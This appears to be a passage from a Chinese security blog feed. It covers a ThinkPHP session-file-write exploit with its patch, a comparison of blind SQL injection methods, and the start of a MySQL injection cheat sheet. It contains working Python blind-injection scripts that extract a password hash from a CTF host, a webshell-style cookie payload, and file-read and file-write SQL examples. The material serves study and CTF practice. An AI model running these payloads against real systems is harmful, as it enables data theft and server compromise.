class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line"><span class="comment">//     Session初始化</span></span><br><span class="line">     \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</span><br></pre></td></tr></table></figure><p>补丁分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> setId(<span class="variable">$id</span>=null):void</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;id = is_string(<span class="variable">$id</span>) &amp;&amp; strlen(<span class="variable">$id</span>) === 32 &amp;&amp; ctype_alnum(<span class="variable">$id</span>) ? <span class="variable">$id</span> : md5(microtime(<span class="literal">true</span>) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在setId中增加了对$id的校验:ctype_alnum($id),只允许数字或字母,来避免任意文件操作<br>参考文章<br><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a><br><a href="http://phoebe233.cn/index.php/archives/19/" target="_blank" rel="noopener">thinkphp v5.1反序列化链poc</a><br><a href="https://xz.aliyun.com/t/7792" target="_blank" rel="noopener">Thinkphp5代码执行学习</a><br><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP 的历史漏洞分析</a><br><a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">ThinkPHP6 任意文件操作漏洞分析</a><br><a href="https://guokeya.github.io/post/gmCesqdBk/" target="_blank" rel="noopener">ThinkPHP6 任意文件操作漏洞分析</a><br><a href=""></a><br><a href=""></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;thinkphp 漏洞的汇总     &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>sql盲注效率分析</title>
    <link href="https://blog.cfyqy.com/article/88d97774.html"/>
    <id>https://blog.cfyqy.com/article/88d97774.html</id>
    <published>2020-12-14T09:30:47.000Z</published>
    <updated>2020-12-27T03:42:33.737Z</updated>
    
    <content type="html"><![CDATA[<p>首发于先知社区<a href="https://xz.aliyun.com/t/7575" target="_blank" rel="noopener">https://xz.aliyun.com/t/7575</a></p><a id="more"></a><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>sql盲注是sql注入的一种，它不会根据你的sql注入语句来返回你想要知道的错误信息。 </p><p>盲注可分为两种:  </p><ul><li>布尔盲注: 根据注入语句返回Ture和False   </li><li>时间盲注: 界面的返回值只有True.加入特定的时间函数，查看web页面返回的时间差来判断注入语句的正确性。 </li></ul><p>因为数据库里的信息无法通过错误信息得到，所以只能通过盲注爆破猜解一个个字符值。<br>常见的猜解方法有三种:      </p><ul><li>遍历法  </li><li>二分法   </li><li>与运算  </li></ul><h1 id="二、方法介绍"><a href="#二、方法介绍" class="headerlink" title="二、方法介绍"></a>二、方法介绍</h1><h2 id="1-遍历法"><a href="#1-遍历法" class="headerlink" title="1.遍历法"></a>1.遍历法</h2><p>通过遍历可打印字符串<code>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&#39;#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_{|}~</code><br>来猜解正确的字符值  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">traversing</span><span class="params">(char)</span>:</span></span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_&#123;|&#125;~"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> chars:</span><br><span class="line"><span class="keyword">if</span> i==char:</span><br><span class="line">print(i)</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line">traversing(<span class="string">'t'</span>)</span><br></pre></td></tr></table></figure><p>效率分析:   </p><p>T(n)=(n+1)/2,这里的n为可打印字符串的长度，这里n为91，则确定一个字符值的大小平均要比较运算46次</p><h2 id="2-二分法"><a href="#2-二分法" class="headerlink" title="2.二分法"></a>2.二分法</h2><p>可打印字符的 ASCII码的值范围大概在0x20和0x7f区间内。</p><p>(1)首先取区间的中间值mid跟目标元素的ascii码值对比，如果相等则结束搜索。<br>(2)如果目标元素的ascii码值小于mid,则在小于mid的区间内查找，否则在大于mid的区间查找，重复(1)<br>(3)如果找不到则退出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary</span><span class="params">(char)</span>:</span></span><br><span class="line">left=<span class="number">0x20</span></span><br><span class="line">right=<span class="number">0x7f</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">mid=left+(right-left)//<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> left==mid:</span><br><span class="line">    print(chr(mid)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> mid&gt;ord(char):</span><br><span class="line">right=mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">left=mid</span><br><span class="line">binary(<span class="string">'t'</span>)</span><br></pre></td></tr></table></figure><p>效率分析:  </p><p>T(n)=log2 n,n=0x7f-0x20=95,则确定一个字符平均比较次数为6.6次。</p><h2 id="3-与运算"><a href="#3-与运算" class="headerlink" title="3.与运算"></a>3.与运算</h2><p>运算规则：</p><p>0 &amp; 0 = 0<br>0 &amp; 1 = 0<br>1 &amp; 0 = 0<br>1 &amp; 1 = 1 </p><p>即：两位同时为“1”，结果才为“1”，否则为0  </p><p>一个byte有8bit，假设8bit的低位到高位的值a、b、c、d、e、f、g、h，并且其值只能为0,1两种，其值大小为<br><code>a*2^0+b*2^1+c*2^2+d*2^3+e*2^4+f*2^5+g*2^6+h*2^7</code>。所以我们只要将其值大小分别于1,2,4,8,16,32,64,128进行与运算，就能够确定每bit位的值，从而猜出其值大小。对于可打印字符的值小于127，最高bit为为0，所以只要比较7次就行了。     </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">and_operation</span><span class="params">(char)</span>:</span></span><br><span class="line">sum=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line"><span class="keyword">if</span> ord(char)&amp;<span class="number">2</span>**i:</span><br><span class="line">sum=sum+<span class="number">2</span>**i</span><br><span class="line">print(chr(sum))</span><br><span class="line">andOperation(<span class="string">'t'</span>)</span><br></pre></td></tr></table></figure><p>效率分析:</p><p>T(n)=7,一个字符值大小需要比较7次确认。</p><p>从上面的效率分析中，遍历法需要平均比较46次，二分法需要平均比较6.6次，与运算需要7次，因为http请求的时间开销会相对大，因此http请求次数越少，花费的时间会越少，所以sql盲注的效率大小为  </p><p><em>二分法&gt;=与运算&gt; 遍历法</em></p><h1 id="三、盲注实例"><a href="#三、盲注实例" class="headerlink" title="三、盲注实例"></a>三、盲注实例</h1><p>这里拿HFSEC平台的一道sql盲注，分别用三种不同的解法来对比一下效率  </p><p>遍历法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spend_time</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">@wraps(func)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*agrs,**kwargs)</span>:</span></span><br><span class="line">startTime=time.time()</span><br><span class="line">func(*agrs,**kwargs)</span><br><span class="line">endTime=time.time()</span><br><span class="line">sumTime=endTime-startTime</span><br><span class="line">print(<span class="string">"spend time:"</span>,sumTime)</span><br><span class="line"><span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@spend_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">traversing</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"http://111.230.11.183:44444/basic_skills/sql/sql3.php"</span></span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_&#123;|&#125;~"</span></span><br><span class="line">flag_payload=  <span class="string">"a' or 1 and ascii(substr((select password from user limit 0,1),&#123;0&#125;,1))=&#123;1&#125; -- "</span></span><br><span class="line">info=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">payload=flag_payload.format(i,ord(char))</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">"username"</span>: payload,</span><br><span class="line"><span class="string">"password"</span>:<span class="string">"ye1s"</span></span><br><span class="line">&#125;</span><br><span class="line">rep=requests.post(url=url,data=data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code==<span class="number">302</span>:</span><br><span class="line">info=info+char</span><br><span class="line">print(info)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">traversing()</span><br></pre></td></tr></table></figure><p>运算结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">40356E66</span>E78BB1DC1EFBC04FA4336F59</span><br><span class="line">spend time: <span class="number">207.9748649597168</span></span><br></pre></td></tr></table></figure><p>二分法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spend_time</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">@wraps(func)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*agrs,**kwargs)</span>:</span></span><br><span class="line">startTime=time.time()</span><br><span class="line">func(*agrs,**kwargs)</span><br><span class="line">endTime=time.time()</span><br><span class="line">sumTime=endTime-startTime</span><br><span class="line">print(<span class="string">"spend time:"</span>,sumTime)</span><br><span class="line"><span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@spend_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"http://111.230.11.183:44444/basic_skills/sql/sql3.php"</span></span><br><span class="line">flag_payload=  <span class="string">"a' or 1 and ascii(substr((select password from user limit 0,1),&#123;0&#125;,1))&lt;&#123;1&#125; -- "</span></span><br><span class="line">info=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">left=<span class="number">0x2</span></span><br><span class="line">right=<span class="number">0x7f</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">mid=left+(right-left)//<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> mid==left:</span><br><span class="line">info=info+chr(mid)</span><br><span class="line">print(info)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">payload=flag_payload.format(i,mid)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">"username"</span>: payload,</span><br><span class="line"><span class="string">"password"</span>:<span class="string">"ye1s"</span></span><br><span class="line">&#125;</span><br><span class="line">rep=requests.post(url=url,data=data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code==<span class="number">302</span>:</span><br><span class="line">right=mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">left=mid</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">binary()</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">40356E66E78BB1DC1EFBC04FA4336F59</span><br><span class="line">spend time: 14.131437301635742</span><br></pre></td></tr></table></figure><p>与运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spend_time</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">@wraps(func)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*agrs,**kwargs)</span>:</span></span><br><span class="line">startTime=time.time()</span><br><span class="line">func(*agrs,**kwargs)</span><br><span class="line">endTime=time.time()</span><br><span class="line">sumTime=endTime-startTime</span><br><span class="line">print(<span class="string">"spend time:"</span>,sumTime)</span><br><span class="line"><span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@spend_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">and_operation</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"http://111.230.11.183:44444/basic_skills/sql/sql3.php"</span></span><br><span class="line">flag_payload=  <span class="string">"a' or 1 and ascii(substr((select password from user limit 0,1),&#123;0&#125;,1))&amp;&#123;1&#125; -- "</span></span><br><span class="line">info=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">value=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">payload=flag_payload.format(j,<span class="number">2</span>**k)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">"username"</span>: payload,</span><br><span class="line"><span class="string">"password"</span>:<span class="string">"ye1s"</span></span><br><span class="line">&#125;</span><br><span class="line">rep=requests.post(url=url,data=data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code==<span class="number">302</span>:</span><br><span class="line">value=value+(<span class="number">2</span>**k)</span><br><span class="line"><span class="keyword">if</span> value==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">info=info+chr(value)</span><br><span class="line">print(info)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">and_operation()</span><br></pre></td></tr></table></figure><p>运算结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">40356E66E78BB1DC1EFBC04FA4336F59</span><br><span class="line">spend time: 15.214633703231812</span><br></pre></td></tr></table></figure><p>从三种的不同解法的运算结果时间来看，遍历法花费了207秒、二分法花费了14秒，与运算花费了15秒。花费的时间还会受到网速和其他因素的影响，不是每次运行都会花费相同的时间，但总的结果来说，遍历法花费的时间很多，二分法和与运算花费的时间比较少。  所以在遇到sql盲注时，建议用二分法和与运算来猜解。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首发于先知社区&lt;a href=&quot;https://xz.aliyun.com/t/7575&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7575&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>sql注入</title>
    <link href="https://blog.cfyqy.com/article/190afa65.html"/>
    <id>https://blog.cfyqy.com/article/190afa65.html</id>
    <published>2020-12-05T16:09:46.000Z</published>
    <updated>2020-12-31T04:24:28.592Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令</p><a id="more"></a><p><img src="../../images/loopholes/sql/sql.png" alt=""><br><a href="https://www.smi1e.top/sql%e6%b3%a8%e5%85%a5%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">Sql注入笔记</a></p><h1 id="mysql基础知识"><a href="#mysql基础知识" class="headerlink" title="mysql基础知识"></a>mysql基础知识</h1><h2 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(str,len)  //从左边开始截取len个字符</span><br><span class="line"></span><br><span class="line">right(str,len) //从右边第index开始截取字符</span><br><span class="line"></span><br><span class="line">substring(str,pos) //从左边index开始截取</span><br><span class="line"></span><br><span class="line">substr(str, pos, len)  //将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 </span><br><span class="line"></span><br><span class="line">mid(str,pos,ken) //截取str 从index开始,截取len的长度</span><br></pre></td></tr></table></figure><h2 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</span><br><span class="line">find_in_set(str,strlist) //如果相同则返回1不同则返回0</span><br></pre></td></tr></table></figure><h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2) //将字符串首尾相连</span><br><span class="line"></span><br><span class="line">concat_ws(separator,str1,str2) //将字符串用指定连接符连接</span><br><span class="line"></span><br><span class="line">group_concat()//用于把多条数据一次注入出来</span><br></pre></td></tr></table></figure><h2 id="一些绕过注入的罕见函数"><a href="#一些绕过注入的罕见函数" class="headerlink" title="一些绕过注入的罕见函数"></a>一些绕过注入的罕见函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">instr(str1,substr) //从子字符串中返回子串第一次出现的位置</span><br><span class="line"></span><br><span class="line">lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</span><br></pre></td></tr></table></figure><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>算术运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * /</span><br></pre></td></tr></table></figure><p>比较运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">= &lt;&gt; != &gt; &lt;</span><br><span class="line"></span><br><span class="line">(1)between //select database() between 0x61 and 0x7a; //select database() between <span class="string">'a'</span> and <span class="string">'z'</span>;</span><br><span class="line">(2)<span class="keyword">in</span> //select <span class="string">'123'</span> <span class="keyword">in</span> (<span class="string">'12'</span>) =&gt; 0</span><br><span class="line">(3)like(模糊匹配) //select <span class="string">'12345'</span> like <span class="string">'12%'</span> =&gt; <span class="literal">true</span></span><br><span class="line">(4)regexp 或 rlike(正则匹配)//select <span class="string">'123455'</span> regexp <span class="string">'^12'</span> =&gt; <span class="literal">true</span></span><br></pre></td></tr></table></figure><p> 逻辑运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not或! 非  </span><br><span class="line">AND 逻辑与 == &amp;&amp;</span><br><span class="line">OR 逻辑或 == ||</span><br><span class="line">XOR 逻辑异或 == ^</span><br></pre></td></tr></table></figure><p>位运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; 按位与</span><br><span class="line">| 按位或</span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br></pre></td></tr></table></figure><p>注释符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># //单行注释符,url记得编码为%23</span></span><br><span class="line">/**/ </span><br><span class="line">--+</span><br></pre></td></tr></table></figure><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p> 延时函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(duration) //暂停duration秒</span><br><span class="line">benchmark(count,expr) //重复执行count次expr</span><br></pre></td></tr></table></figure><p> 编码函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONV(N,from_base,to_base) //N是要转换的数据，from_base是原进制，to_base是目标进制 </span><br><span class="line">hex(num) //转化成16进制</span><br><span class="line">unhex() </span><br><span class="line">ord(str)   //返回字符串第一个字符的ASCII 值</span><br><span class="line">ascii(str) //返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</span><br></pre></td></tr></table></figure><p>文件函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select 1,2,load_file('</span>/etc/init.d/httpd<span class="string">')  //读取文件</span></span><br><span class="line"><span class="string">select xxoo into outfile '</span>路径<span class="string">' //权限较高时可直接写文件</span></span><br></pre></td></tr></table></figure><h2 id="一些构造语句"><a href="#一些构造语句" class="headerlink" title="一些构造语句"></a>一些构造语句</h2><p>条件语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(expr1,expr2,expr3) // expr1 <span class="literal">true</span>执行expr2否则执行expr3</span><br><span class="line">select <span class="keyword">case</span> when (条件) <span class="keyword">then</span> 代码1 <span class="keyword">else</span> 代码 2 end</span><br><span class="line">IFNULL() </span><br><span class="line">NULLIF()</span><br></pre></td></tr></table></figure><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user()：当前数据库用户</span><br><span class="line">database()：当前数据库名 </span><br><span class="line">version()：当前使用的数据库版本  </span><br><span class="line">@@datadir：数据库存储数据路径  </span><br><span class="line">length(str) ：返回字符串str的长度     </span><br><span class="line">information_schema //系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</span><br><span class="line">SCHEMATA//储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</span><br><span class="line">TABLES//储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</span><br><span class="line">COLUMNS//储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</span><br></pre></td></tr></table></figure><h1 id="手工注入基本流程"><a href="#手工注入基本流程" class="headerlink" title="手工注入基本流程"></a>手工注入基本流程</h1><p>MySQL &gt;= 5.0<br> 获取字段数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure><p> 获取当前数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure><p>获取数据库中的表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure><p> 获取表中的字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns <span 